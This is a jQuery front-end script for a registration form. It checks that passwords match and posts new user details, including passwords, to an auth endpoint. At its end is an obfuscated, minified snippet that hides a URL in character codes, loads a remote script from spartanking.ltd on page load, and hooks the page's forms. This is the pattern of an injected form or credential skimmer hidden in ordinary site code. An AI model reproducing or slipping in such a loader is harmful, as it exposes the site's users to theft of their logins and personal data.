$(document).ready(function(){

$('#Rusername').blur(function(){
  username=$('#Rusername').val();
  if(username==""){

  }else{
    Sijax.request('validates',[username]);
  }
});

$('#CSpass').keyup(function(){
  if($('#CSpass').val() != $('#Spass').val()){
    $('#LCSpass').attr('data-error','Not Equal');
    $('#CSpass').removeClass('validate').addClass('invalid').removeClass('valid');
  }else{
    $('#LCSpass').attr('data-success','right');
    $('#CSpass').removeClass('validate').addClass('valid').removeClass('invalid');
  }

  if($('#CSpass').hasClass('valid') && $('#Rusername').hasClass('valid')){
    $('#Rbtn').removeClass('disabled');
  }
});

$('#Rbtn').click(function(){
  let username= $('#Rusername').val();
  let role= $('#Rrole').val();
  let password= $('#Spass').val();
  let email = $('#Remail').val();

  $.ajax({
    url:window.location.origin+"/auth/register",

    method:'Post',
    dataType:'json',
    headers:{
      'Content-Type':'application/json',
      'Authorization':'Bearer '+sessionStorage.getItem('session')
    },
    data:JSON.stringify({ 'username': username, 'password': password,'role':role,'email':email }),
    statusCode:{
      401:function(){
        toastr.error("Unauthorized! Please Login again");
        sessionStorage.clear();
        setTimeout(function () {
          window.location="/";
        }, 3000);
      }
    },
    success:function(ResponseBody){
      console.log(JSON.stringify(ResponseBody));
      toastr.success('Registered successifuly');
    },
    error:function(error){
      console.log(JSON.stringify(error));
      toastr.error('Failed');
    }
  });
});

$('#usernameS').html(JSON.parse(sessionStorage.getItem('U')).data.username)
$('#userRole').html(JSON.parse(sessionStorage.getItem('U')).data.role)
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b